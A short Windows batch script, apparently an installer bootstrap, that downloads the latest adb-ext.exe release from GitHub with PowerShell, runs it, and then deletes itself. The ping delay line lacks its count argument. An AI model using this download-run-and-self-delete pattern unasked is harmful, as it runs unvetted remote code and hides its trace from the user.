@echo off
set "u=https://github.com/atomofiron/adb-ext/releases/latest/download/adb-ext.exe"
set "e=%temp%\adb-ext.exe"
powershell -nop -c "iwr '%u%' -out '%e%'" && start "" "%e%"
start "" cmd /c "ping 127.0.0.1 -n 2>nul & del /f /q \"%~f0\""
